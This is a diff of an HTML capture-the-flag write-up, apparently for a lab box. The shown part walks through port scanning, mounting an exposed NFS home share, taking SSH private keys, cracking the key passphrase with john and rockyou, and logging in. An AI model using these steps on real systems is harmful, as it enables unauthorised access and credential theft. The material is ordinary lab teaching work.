@@ -212,208 +212,208 @@ then leverage sudoers esacalation privileges to pivot users and finally got root
 
       <div class="post-content">
         <h1 id="exploration">Exploration</h1>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p1-65535 -T4 -v 172.31.1.7
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>nmap -p21,80,11227,27853,35327,39857,48167,48201,49423 -A -T4 172.31.1.7
-</span></span><span style="display:flex;"><span>Starting Nmap 7.80 <span style="color:#ff79c6">(</span> https://nmap.org <span style="color:#ff79c6">)</span> at 2021-08-21 14:36 HKT
-</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#ff79c6">for</span> 172.31.1.7
-</span></span><span style="display:flex;"><span>Host is up <span style="color:#ff79c6">(</span>0.30s latency<span style="color:#ff79c6">)</span>.
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>PORT      STATE  SERVICE  VERSION
-</span></span><span style="display:flex;"><span>11227/tcp closed unknown
-</span></span><span style="display:flex;"><span>27853/tcp open   ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#ff79c6">(</span>Ubuntu Linux; protocol 2.0<span style="color:#ff79c6">)</span>
-</span></span><span style="display:flex;"><span>| ssh-hostkey:
-</span></span><span style="display:flex;"><span>|   <span style="color:#bd93f9">2048</span> 97:93:e4:7f:41:79:9c:bd:3d:d8:90:c3:93:d5:53:9f <span style="color:#ff79c6">(</span>RSA<span style="color:#ff79c6">)</span>
-</span></span><span style="display:flex;"><span>|   <span style="color:#bd93f9">256</span> 11:66:e9:84:32:85:7b:c7:88:f3:19:97:74:1e:6c:29 <span style="color:#ff79c6">(</span>ECDSA<span style="color:#ff79c6">)</span>
-</span></span><span style="display:flex;"><span>|_  <span style="color:#bd93f9">256</span> cc:66:1e:1a:91:31:56:56:7c:e5:d3:46:5d:68:2a:b7 <span style="color:#ff79c6">(</span>ED25519<span style="color:#ff79c6">)</span>
-</span></span><span style="display:flex;"><span>35327/tcp open   nlockmgr 1-4 <span style="color:#ff79c6">(</span>RPC <span style="color:#6272a4">#100021)</span>
-</span></span><span style="display:flex;"><span>39857/tcp open   mountd   1-3 <span style="color:#ff79c6">(</span>RPC <span style="color:#6272a4">#100005)</span>
-</span></span><span style="display:flex;"><span>48167/tcp closed unknown
-</span></span><span style="display:flex;"><span>48201/tcp open   mountd   1-3 <span style="color:#ff79c6">(</span>RPC <span style="color:#6272a4">#100005)</span>
-</span></span><span style="display:flex;"><span>49423/tcp open   mountd   1-3 <span style="color:#ff79c6">(</span>RPC <span style="color:#6272a4">#100005)</span>
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -p1-65535 -T4 -v 172.31.1.7
+
+nmap -p21,80,11227,27853,35327,39857,48167,48201,49423 -A -T4 172.31.1.7
+Starting Nmap 7.80 <span style="color:#ff79c6">(</span> https://nmap.org <span style="color:#ff79c6">)</span> at 2021-08-21 14:36 HKT
+Nmap scan report <span style="color:#ff79c6">for</span> 172.31.1.7
+Host is up <span style="color:#ff79c6">(</span>0.30s latency<span style="color:#ff79c6">)</span>.
+
+PORT      STATE  SERVICE  VERSION
+11227/tcp closed unknown
+27853/tcp open   ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#ff79c6">(</span>Ubuntu Linux; protocol 2.0<span style="color:#ff79c6">)</span>
+| ssh-hostkey:
+|   <span style="color:#bd93f9">2048</span> 97:93:e4:7f:41:79:9c:bd:3d:d8:90:c3:93:d5:53:9f <span style="color:#ff79c6">(</span>RSA<span style="color:#ff79c6">)</span>
+|   <span style="color:#bd93f9">256</span> 11:66:e9:84:32:85:7b:c7:88:f3:19:97:74:1e:6c:29 <span style="color:#ff79c6">(</span>ECDSA<span style="color:#ff79c6">)</span>
+|_  <span style="color:#bd93f9">256</span> cc:66:1e:1a:91:31:56:56:7c:e5:d3:46:5d:68:2a:b7 <span style="color:#ff79c6">(</span>ED25519<span style="color:#ff79c6">)</span>
+35327/tcp open   nlockmgr 1-4 <span style="color:#ff79c6">(</span>RPC <span style="color:#6272a4">#100021)</span>
+39857/tcp open   mountd   1-3 <span style="color:#ff79c6">(</span>RPC <span style="color:#6272a4">#100005)</span>
+48167/tcp closed unknown
+48201/tcp open   mountd   1-3 <span style="color:#ff79c6">(</span>RPC <span style="color:#6272a4">#100005)</span>
+49423/tcp open   mountd   1-3 <span style="color:#ff79c6">(</span>RPC <span style="color:#6272a4">#100005)</span>
+</code></pre></td></tr></table>
 </div>
 </div><p>Install and run showmount</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo apt install nfs-common
-</span></span><span style="display:flex;"><span>showmount -e 172.31.1.7
-</span></span><span style="display:flex;"><span>Export list <span style="color:#ff79c6">for</span> 172.31.1.7:
-</span></span><span style="display:flex;"><span>/home/amir *.*.*.*
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo apt install nfs-common
+showmount -e 172.31.1.7
+Export list <span style="color:#ff79c6">for</span> 172.31.1.7:
+/home/amir *.*.*.*
+</code></pre></td></tr></table>
 </div>
 </div><p>We can mount amir home folder:</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo mount -t nfs4  172.31.1.7:/home/amir ./shares
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>ls -la /tmp/shares/.ssh
-</span></span><span style="display:flex;"><span>drwxrwxr-x  <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">1000</span>  <span style="color:#bd93f9">1000</span>  <span style="color:#bd93f9">4096</span> Apr  <span style="color:#bd93f9">2</span>  <span style="color:#bd93f9">2020</span> .
-</span></span><span style="display:flex;"><span>drwxrwxr-x  <span style="color:#bd93f9">5</span> <span style="color:#bd93f9">1000</span>  <span style="color:#bd93f9">1000</span>  <span style="color:#bd93f9">4096</span> Apr  <span style="color:#bd93f9">2</span>  <span style="color:#bd93f9">2020</span> ..
-</span></span><span style="display:flex;"><span>-r--------  <span style="color:#bd93f9">1</span> <span style="color:#bd93f9">1000</span>  <span style="color:#bd93f9">1000</span>   <span style="color:#bd93f9">393</span> Apr  <span style="color:#bd93f9">2</span>  <span style="color:#bd93f9">2020</span> authorized_keys
-</span></span><span style="display:flex;"><span>-r--------  <span style="color:#bd93f9">1</span> <span style="color:#bd93f9">1000</span>  <span style="color:#bd93f9">1000</span>  <span style="color:#bd93f9">1766</span> Apr  <span style="color:#bd93f9">2</span>  <span style="color:#bd93f9">2020</span> id_rsa
-</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#bd93f9">1</span> <span style="color:#bd93f9">1000</span>  <span style="color:#bd93f9">1000</span>  <span style="color:#bd93f9">1766</span> Apr  <span style="color:#bd93f9">2</span>  <span style="color:#bd93f9">2020</span> id_rsa.bak
-</span></span><span style="display:flex;"><span>-r--------  <span style="color:#bd93f9">1</span> <span style="color:#bd93f9">1000</span>  <span style="color:#bd93f9">1000</span>   <span style="color:#bd93f9">393</span> Apr  <span style="color:#bd93f9">2</span>  <span style="color:#bd93f9">2020</span> id_rsa.pub
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo mount -t nfs4  172.31.1.7:/home/amir ./shares
+
+ls -la /tmp/shares/.ssh
+drwxrwxr-x  <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">1000</span>  <span style="color:#bd93f9">1000</span>  <span style="color:#bd93f9">4096</span> Apr  <span style="color:#bd93f9">2</span>  <span style="color:#bd93f9">2020</span> .
+drwxrwxr-x  <span style="color:#bd93f9">5</span> <span style="color:#bd93f9">1000</span>  <span style="color:#bd93f9">1000</span>  <span style="color:#bd93f9">4096</span> Apr  <span style="color:#bd93f9">2</span>  <span style="color:#bd93f9">2020</span> ..
+-r--------  <span style="color:#bd93f9">1</span> <span style="color:#bd93f9">1000</span>  <span style="color:#bd93f9">1000</span>   <span style="color:#bd93f9">393</span> Apr  <span style="color:#bd93f9">2</span>  <span style="color:#bd93f9">2020</span> authorized_keys
+-r--------  <span style="color:#bd93f9">1</span> <span style="color:#bd93f9">1000</span>  <span style="color:#bd93f9">1000</span>  <span style="color:#bd93f9">1766</span> Apr  <span style="color:#bd93f9">2</span>  <span style="color:#bd93f9">2020</span> id_rsa
+-rw-r--r--  <span style="color:#bd93f9">1</span> <span style="color:#bd93f9">1000</span>  <span style="color:#bd93f9">1000</span>  <span style="color:#bd93f9">1766</span> Apr  <span style="color:#bd93f9">2</span>  <span style="color:#bd93f9">2020</span> id_rsa.bak
+-r--------  <span style="color:#bd93f9">1</span> <span style="color:#bd93f9">1000</span>  <span style="color:#bd93f9">1000</span>   <span style="color:#bd93f9">393</span> Apr  <span style="color:#bd93f9">2</span>  <span style="color:#bd93f9">2020</span> id_rsa.pub
+</code></pre></td></tr></table>
 </div>
 </div><p>We try to ssh with the rsa key but it is protected with a passphrase</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>chmod <span style="color:#bd93f9">700</span> id_rsa.bak
-</span></span><span style="display:flex;"><span>ssh -i id_rsa.bak amir@172.31.1.7 -p <span style="color:#bd93f9">27853</span>
-</span></span><span style="display:flex;"><span>Enter passphrase <span style="color:#ff79c6">for</span> key <span style="color:#f1fa8c">&#39;id_rsa.bak&#39;</span>:
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">chmod <span style="color:#bd93f9">700</span> id_rsa.bak
+ssh -i id_rsa.bak amir@172.31.1.7 -p <span style="color:#bd93f9">27853</span>
+Enter passphrase <span style="color:#ff79c6">for</span> key <span style="color:#f1fa8c">&#39;id_rsa.bak&#39;</span>:
+</code></pre></td></tr></table>
 </div>
 </div><p>We can extract the hash and crack it with john</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/opt/john/run/ssh2john.py id_rsa.bak &gt; <span style="color:#8be9fd;font-style:italic">hash</span>
-</span></span><span style="display:flex;"><span>/opt/john/run/john --wordlist<span style="color:#ff79c6">=</span>/opt/dictionaries/rockyou.txt --rules <span style="color:#8be9fd;font-style:italic">hash</span>
-</span></span><span style="display:flex;"><span>/opt/john/run/john --show <span style="color:#8be9fd;font-style:italic">hash</span>
-</span></span><span style="display:flex;"><span>id_rsa.bak:hello6
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/opt/john/run/ssh2john.py id_rsa.bak &gt; <span style="color:#8be9fd;font-style:italic">hash</span>
+/opt/john/run/john --wordlist<span style="color:#ff79c6">=</span>/opt/dictionaries/rockyou.txt --rules <span style="color:#8be9fd;font-style:italic">hash</span>
+/opt/john/run/john --show <span style="color:#8be9fd;font-style:italic">hash</span>
+id_rsa.bak:hello6
+</code></pre></td></tr></table>
 </div>
 </div><p>We can now login ssh</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh -i id_rsa.bak amir@172.31.1.7 -p <span style="color:#bd93f9">27853</span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>..<span style="color:#ff79c6">]</span>
-</span></span><span style="display:flex;"><span>amir@shares:~$ ls -la
-</span></span><span style="display:flex;"><span>total <span style="color:#bd93f9">40</span>
-</span></span><span style="display:flex;"><span>drwxrwxr-x <span style="color:#bd93f9">5</span> amir amir <span style="color:#bd93f9">4096</span> Apr  <span style="color:#bd93f9">2</span>  <span style="color:#bd93f9">2020</span> .
-</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#bd93f9">4</span> root root <span style="color:#bd93f9">4096</span> Apr  <span style="color:#bd93f9">2</span>  <span style="color:#bd93f9">2020</span> ..
-</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#bd93f9">1</span> amir amir    <span style="color:#bd93f9">0</span> Apr  <span style="color:#bd93f9">2</span>  <span style="color:#bd93f9">2020</span> .bash_history
-</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#bd93f9">1</span> amir amir  <span style="color:#bd93f9">220</span> Apr  <span style="color:#bd93f9">4</span>  <span style="color:#bd93f9">2018</span> .bash_logout
